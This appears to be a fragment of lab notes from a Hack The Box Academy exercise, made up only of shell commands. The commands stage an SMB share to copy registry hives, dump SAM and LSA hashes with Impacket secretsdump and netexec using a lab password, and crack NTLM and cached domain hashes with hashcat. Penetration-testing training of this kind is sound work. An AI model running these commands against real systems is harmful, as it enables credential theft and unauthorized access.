...
```shell-session
xF1NN@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-xxxxxxx/Documents
...
```shell-session
xF1NN@htb[/htb]$ locate secretsdump 
```
...
```shell-session
xF1NN@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
...
```shell-session
xF1NN@htb[/htb]$ sudo vim hashestocrack.txt
...
```shell-session
xF1NN@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
...
```shell-session
xF1NN@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
...
```shell-session
xF1NN@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
